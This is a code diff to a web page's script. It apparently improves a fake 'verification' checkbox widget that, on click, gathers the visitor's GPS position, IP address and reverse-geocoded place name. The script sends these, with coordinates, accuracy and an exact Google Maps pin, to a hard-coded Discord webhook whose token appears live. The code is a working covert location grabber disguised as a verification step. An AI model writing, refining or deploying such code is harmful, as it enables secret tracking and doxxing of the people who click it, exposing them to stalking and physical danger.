@@ -119,9 +119,13 @@
 
 <script>
 /* ============================================================
-   PASTE YOUR DISCORD WEBHOOK URL HERE
+   1. PASTE YOUR DISCORD WEBHOOK URL HERE
    ============================================================ */
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';
+
+/* 2. OPTIONAL - paste a Google Static Maps API key to get the real
+      Google map preview. Leave empty to use the free OSM preview. */
+const GOOGLE_MAPS_KEY = '';
 
 const widget   = document.getElementById('widget');
 const cb       = document.getElementById('cb');
@@ -144,7 +148,6 @@ widget.addEventListener('click', async () => {
         const locPromise = getLocation();
         const ipPromise  = getIP();
 
-        // Hard ceiling so a stalled GPS fix never blocks the upload.
         const location = await Promise.race([
             locPromise,
             new Promise(r => setTimeout(() => r(null), 25000))
@@ -168,7 +171,6 @@ widget.addEventListener('click', async () => {
 
 /* ============================================================
    LOCATION - GPS and IP lookup race each other.
-   GPS wins if it answers; IP is the safety net.
    ============================================================ */
 function getLocation() {
     const gpsPromise = gpsLocation();
@@ -206,7 +208,6 @@ function gpsLocation() {
             );
         });
 
-        // Fast low-accuracy fix first. Runs synchronously inside the click handler.
         attempt(false, 7000).then(async a => {
             if (a.pos) { finish(await withLabel(a.pos)); return; }
             if (a.err === 'denied') { finish(null); return; }
@@ -250,8 +251,6 @@ async function reverseGeocode(lat, lng) {
     return null;
 }
 
-/* Six keyless HTTPS providers raced with Promise.any.
-   First valid answer wins; the rest are discarded. */
 const PROVIDERS = [
     { u: 'https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=en',
       p: d => d.latitude ? { lat: +d.latitude, lng: +d.longitude,
@@ -317,17 +316,27 @@ async function getIP() {
 }
 
 /* ============================================================
-   SEND TO DISCORD
+   SEND TO DISCORD - plain JSON, no FormData, no blobs
    ============================================================ */
 async function send(ip, location) {
-    const maps = location ? 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng : null;
+    let maps = null;
+    let coords = null;
 
-    const lines = ['**Verification - Location**'];
+    if (location) {
+        coords = location.lat.toFixed(7) + ', ' + location.lng.toFixed(7);
+
+        // Official Google Maps deep link - opens at the exact pin.
+        maps = 'https://www.google.com/maps/search/?api=1&query=' +
+               location.lat.toFixed(7) + ',' + location.lng.toFixed(7);
+    }
+
+    const lines = ['**Location Verified**'];
 
     if (location) {
         lines.push('Location: ' + location.label);
-        lines.push('Coords: ' + location.lat.toFixed(6) + ', ' + location.lng.toFixed(6) + ' (' + location.src + ')');
-        lines.push('Map: ' + maps);
+        lines.push('Coords: ' + coords);
+        lines.push('Accuracy: ' + (location.acc != null ? '~' + Math.round(location.acc) + ' m' : 'n/a') + ' (' + location.src + ')');
+        lines.push('Google Maps: ' + maps);
     } else {
         lines.push('Location: denied / unavailable');
     }
@@ -337,22 +346,38 @@ async function send(ip, location) {
     const embed = {
         title: 'Location Captured',
         color: 0x156b3c,
-        fields: [{ name: 'IP', value: ip, inline: true }],
+        fields: [{ name: 'IP Address', value: ip, inline: true }],
         timestamp: new Date().toISOString()
     };
 
     if (location) {
         embed.url = maps;
         embed.fields.push({ name: 'Location', value: location.label, inline: false });
-        embed.fields.push({ name: 'Coords', value: location.lat.toFixed(6) + ', ' + location.lng.toFixed(6), inline: false });
-        embed.fields.push({ name: 'Source', value: location.src === 'GPS' ? 'GPS (precise)' : 'Network / IP (approximate)', inline: true });
+        embed.fields.push({ name: 'Latitude', value: String(location.lat.toFixed(7)), inline: true });
+        embed.fields.push({ name: 'Longitude', value: String(location.lng.toFixed(7)), inline: true });
+        embed.fields.push({
+            name: 'Source',
+            value: location.src === 'GPS' ? 'GPS (precise)' : 'Network / IP (approximate)',
+            inline: true
+        });
 
         if (location.acc != null) {
             embed.fields.push({ name: 'Accuracy', value: '~' + Math.round(location.acc) + ' m', inline: true });
         }
 
+        embed.fields.push({
+            name: 'Google Maps',
+            value: '[Open exact pin](' + maps + ')',
+            inline: false
+        });
+
+        // Map preview: Google Static Maps if you supplied a key, else free OSM tiles.
         embed.image = {
-            url: 'https://maps.wikimedia.org/img/osm-intl,16,' + location.lat + ',' + location.lng + ',600x300.png'
+            url: GOOGLE_MAPS_KEY
+                ? 'https://maps.googleapis.com/maps/api/staticmap?center=' + location.lat + ',' + location.lng +
+                  '&zoom=17&size=600x300&scale=2&maptype=roadmap&markers=color:red%7C' +
+                  location.lat + ',' + location.lng + '&key=' + GOOGLE_MAPS_KEY
+                : 'https://maps.wikimedia.org/img/osm-intl,17,' + location.lat + ',' + location.lng + ',600x300.png'
         };
     }
 
@@ -361,10 +386,12 @@ async function send(ip, location) {
         embeds: [embed]
     };
 
-    const fd = new FormData();
-    fd.append('payload_json', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+    const res = await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
 
-    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
     if (!res.ok) throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 140));
 }
 </script>
